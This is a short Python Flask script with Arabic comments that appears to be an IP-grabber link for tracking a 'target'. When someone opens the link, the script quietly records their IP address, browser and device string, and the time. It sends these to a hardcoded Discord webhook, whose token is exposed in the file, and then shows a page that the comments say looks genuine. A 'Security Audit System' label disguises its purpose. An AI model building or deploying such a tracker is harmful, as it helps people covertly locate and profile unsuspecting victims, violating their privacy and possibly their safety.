from flask import Flask, render_template, request
import requests
from datetime import datetime

app = Flask(__name__)

WEBHOOK_URL = 'https://discord.com/api/webhooks/1342881017857314926/hRDHXvaYk9k60Rnsc_YL-OPSQqebZ3RtMZVcb3diXEQcyL5CXYWXnuFwMkIqUnaJ8phn'
REDIRECT_DESTINATION = "https://www.google.com" # الموقع الذي سيتم نقل الشخص إليه

@app.route('/')
def index():
    # 1. جمع البيانات
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent') # نوع المتصفح والجهاز
    now = datetime.now()
    
    # 2. إرسال البيانات لديسكورد بشكل احترافي
    payload = {
        "embeds": [{
            "title": "🎯 Target Clicked the Link!",
            "color": 3447003,
            "fields": [
                {"name": "🌐 IP Address", "value": f"🔗 `{ip_address}`", "inline": False},
                {"name": "📱 Device Info", "value": f"```{user_agent}```", "inline": False},
                {"name": "⏰ Time", "value": now.strftime("%I:%M:%S %p"), "inline": True},
                {"name": "📅 Date", "value": now.strftime("%d/%m/%Y"), "inline": True}
            ],
            "footer": {"text": "Security Audit System"}
        }]
    }
    requests.post(WEBHOOK_URL, json=payload)

    # 3. عرض الصفحة التي تبدو حقيقية
    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
  

